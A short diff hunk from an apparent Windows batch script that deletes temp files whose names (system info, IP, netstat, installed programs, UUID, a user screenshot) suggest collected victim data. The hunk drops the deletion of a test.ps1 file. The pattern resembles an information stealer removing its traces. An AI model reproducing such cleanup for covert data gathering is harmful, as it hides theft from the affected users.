@@ -186,7 +186,6 @@ del %userprofile%\AppData\Local\Temp\ipp.txt
 del %userprofile%\AppData\Local\Temp\sysi.txt 
 del %userprofile%\AppData\Local\Temp\System_INFO.txt 
 del %userprofile%\AppData\Local\Temp\netstat.txt 
-del %userprofile%\AppData\Local\Temp\test.ps1 
 del %userprofile%\AppData\Local\Temp\programms.txt 
 del %userprofile%\AppData\Local\Temp\%username%_Capture.jpg
 del %userprofile%\AppData\Local\Temp\uuid.txt
